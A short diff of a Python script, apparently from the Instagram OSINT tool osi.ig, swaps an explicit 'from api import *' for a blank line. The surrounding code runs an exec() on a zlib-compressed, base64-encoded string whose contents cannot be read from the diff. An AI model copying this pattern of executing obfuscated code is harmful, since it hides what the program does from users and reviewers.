@@ -5,7 +5,7 @@ try:
 	import os, sys
 	import zlib, base64
 	exec(zlib.decompress(base64.b64decode('eJzLL9ZLzkjJLNJQ18vJTFLXtC6uLNYrSCzJ0EssKEjNS9HIL9ZLTy1JLk/R0NTkAgB0qg90')))
-	from api import *
+
 except ImportError:
 	print("\033[1;32m[\033[1;31m!\033[1;32m] Use Orignal Script")
 	print("\033[1;32m[\033[1;31m!\033[1;32m] github.com/th3unkn0n/osi.ig")
